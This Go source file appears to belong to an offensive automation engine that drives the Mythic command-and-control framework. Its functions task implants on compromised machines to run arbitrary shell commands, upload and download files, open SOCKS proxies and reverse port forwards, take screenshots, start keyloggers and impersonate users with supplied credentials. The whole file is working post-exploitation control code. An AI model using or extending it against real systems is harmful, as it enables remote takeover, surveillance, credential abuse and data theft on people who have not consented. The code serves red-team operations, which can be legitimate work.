package mythic

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/ares/engine/internal/logger"
)

func (e *MythicEngine) InteractCallback(callbackID int) (string, error) {
	e.mu.RLock()
	cb, ok := e.callbacks[callbackID]
	e.mu.RUnlock()

	if !ok {
		callbacks, err := e.GetCallbacks()
		if err != nil {
			return "", fmt.Errorf("interact: %w", err)
		}
		for _, c := range callbacks {
			if c.ID == callbackID {
				cb = &c
				ok = true
				break
			}
		}
	}

	if !ok {
		return "", fmt.Errorf("callback %d not found", callbackID)
	}

	return fmt.Sprintf("[+] Interacting with callback %d (%s @ %s [%s])",
		callbackID, cb.User, cb.Computer, cb.InternalIP), nil
}

func (e *MythicEngine) ExecuteCommand(callbackID int, command string) (string, error) {
	task, err := e.SubmitTaskDirect(callbackID, command)
	if err != nil {
		return "", fmt.Errorf("execute command: %w", err)
	}

	for i := 0; i < 30; i++ {
		result, err := e.GetTaskResult(task.ID)
		if err != nil {
			return "", fmt.Errorf("get result: %w", err)
		}
		if result.Status == "completed" || result.Status == "error" {
			return fmt.Sprintf("[+] Command result for task %d:\n%s", task.ID, result.Result), nil
		}
		time.Sleep(2 * time.Second)
	}

	return fmt.Sprintf("[+] Command submitted (task %d), result pending", task.ID), nil
}

func (e *MythicEngine) ExecuteRawCommand(callbackID int, shellCommand string) (string, error) {
	params := map[string]interface{}{
		"command": shellCommand,
	}
	task, err := e.SubmitTask(callbackID, "shell", params)
	if err != nil {
		return "", fmt.Errorf("execute raw command: %w", err)
	}

	for i := 0; i < 30; i++ {
		result, err := e.GetTaskResult(task.ID)
		if err != nil {
			return "", fmt.Errorf("get result: %w", err)
		}
		if result.Status == "completed" || result.Status == "error" {
			return fmt.Sprintf("[+] Shell command result:\n%s", result.Result), nil
		}
		time.Sleep(2 * time.Second)
	}

	return fmt.Sprintf("[+] Shell command submitted (task %d)", task.ID), nil
}

func (e *MythicEngine) UploadFileToCallback(callbackID int, localPath, remotePath string) (string, error) {
	fileID, err := e.UploadFile(localPath)
	if err != nil {
		return "", fmt.Errorf("upload to callback: %w", err)
	}

	params := map[string]interface{}{
		"file_id":     fileID,
		"remote_path": remotePath,
	}
	task, err := e.SubmitTask(callbackID, "upload", params)
	if err != nil {
		return "", fmt.Errorf("submit upload task: %w", err)
	}

	result := fmt.Sprintf("[+] Upload task %d: %s -> %s (file_id=%d)", task.ID, localPath, remotePath, fileID)
	logger.Info("[Mythic] " + result)
	return result, nil
}

func (e *MythicEngine) DownloadFileFromCallback(callbackID int, remotePath, localPath string) (string, error) {
	params := map[string]interface{}{
		"path": remotePath,
	}
	task, err := e.SubmitTask(callbackID, "download", params)
	if err != nil {
		return "", fmt.Errorf("submit download task: %w", err)
	}

	for i := 0; i < 30; i++ {
		result, err := e.GetTaskResult(task.ID)
		if err != nil {
			return "", fmt.Errorf("get result: %w", err)
		}
		if result.Status == "completed" {
			if result.Result != "" {
				os.WriteFile(localPath, []byte(result.Result), 0644)
			}
			return fmt.Sprintf("[+] Download task %d complete: %s -> %s", task.ID, remotePath, localPath), nil
		}
		time.Sleep(2 * time.Second)
	}

	return fmt.Sprintf("[+] Download task %d submitted: %s", task.ID, remotePath), nil
}

func (e *MythicEngine) KillCallback(callbackID int) (string, error) {
	params := map[string]interface{}{
		"callback_id": callbackID,
	}
	body, _ := json.Marshal(params)

	data, err := e.apiCall("POST", "/api/v1.4/callbacks/kill", strings.NewReader(string(body)))
	if err != nil {
		return "", fmt.Errorf("kill callback: %w", err)
	}

	e.mu.Lock()
	if cb, ok := e.callbacks[callbackID]; ok {
		cb.Active = false
	}
	e.mu.Unlock()

	result := fmt.Sprintf("[+] Callback %d killed: %s", callbackID, string(data))
	logger.Info("[Mythic] " + result)
	return result, nil
}

func (e *MythicEngine) SocksStart(callbackID int, port int) (string, error) {
	params := map[string]interface{}{
		"port": port,
	}
	task, err := e.SubmitTask(callbackID, "socks", params)
	if err != nil {
		return "", fmt.Errorf("socks start: %w", err)
	}
	return fmt.Sprintf("[+] SOCKS proxy task %d: callback %d on port %d", task.ID, callbackID, port), nil
}

func (e *MythicEngine) SocksStop(callbackID int) (string, error) {
	params := map[string]interface{}{
		"action": "stop",
	}
	task, err := e.SubmitTask(callbackID, "socks", params)
	if err != nil {
		return "", fmt.Errorf("socks stop: %w", err)
	}
	return fmt.Sprintf("[+] SOCKS stop task %d: callback %d", task.ID, callbackID), nil
}

func (e *MythicEngine) PortForward(callbackID int, localPort, remoteHost, remotePort string) (string, error) {
	params := map[string]interface{}{
		"local_port":  localPort,
		"remote_host": remoteHost,
		"remote_port": remotePort,
	}
	task, err := e.SubmitTask(callbackID, "rportfwd", params)
	if err != nil {
		return "", fmt.Errorf("port forward: %w", err)
	}
	return fmt.Sprintf("[+] Port forward task %d: 127.0.0.1:%s -> %s:%s", task.ID, localPort, remoteHost, remotePort), nil
}

func (e *MythicEngine) ListFiles(callbackID int, path string) (string, error) {
	params := map[string]interface{}{
		"path": path,
	}
	task, err := e.SubmitTask(callbackID, "ls", params)
	if err != nil {
		return "", fmt.Errorf("list files: %w", err)
	}

	for i := 0; i < 30; i++ {
		result, err := e.GetTaskResult(task.ID)
		if err != nil {
			return "", err
		}
		if result.Status == "completed" {
			return fmt.Sprintf("[+] File listing for %s:\n%s", path, result.Result), nil
		}
		time.Sleep(2 * time.Second)
	}

	return fmt.Sprintf("[+] File listing task %d submitted", task.ID), nil
}

func (e *MythicEngine) Screenshot(callbackID int) (string, error) {
	task, err := e.SubmitTaskDirect(callbackID, "screenshot")
	if err != nil {
		return "", fmt.Errorf("screenshot: %w", err)
	}

	for i := 0; i < 30; i++ {
		result, err := e.GetTaskResult(task.ID)
		if err != nil {
			return "", err
		}
		if result.Status == "completed" {
			return fmt.Sprintf("[+] Screenshot from callback %d:\n%s", callbackID, result.Result), nil
		}
		time.Sleep(2 * time.Second)
	}

	return fmt.Sprintf("[+] Screenshot task %d submitted", task.ID), nil
}

func (e *MythicEngine) Keylog(callbackID int) (string, error) {
	params := map[string]interface{}{
		"action": "start",
	}
	task, err := e.SubmitTask(callbackID, "keylog", params)
	if err != nil {
		return "", fmt.Errorf("keylog: %w", err)
	}
	return fmt.Sprintf("[+] Keylogger task %d started on callback %d", task.ID, callbackID), nil
}

func (e *MythicEngine) TokenMake(callbackID int, user, domain, password string) (string, error) {
	params := map[string]interface{}{
		"user":     user,
		"domain":   domain,
		"password": password,
	}
	task, err := e.SubmitTask(callbackID, "make_token", params)
	if err != nil {
		return "", fmt.Errorf("token make: %w", err)
	}
	return fmt.Sprintf("[+] Make token task %d: %s\\%s", task.ID, domain, user), nil
}

func (e *MythicEngine) TokenRevert(callbackID int) (string, error) {
	task, err := e.SubmitTaskDirect(callbackID, "rev2self")
	if err != nil {
		return "", fmt.Errorf("token revert: %w", err)
	}
	return fmt.Sprintf("[+] Token revert task %d on callback %d", task.ID, callbackID), nil
}
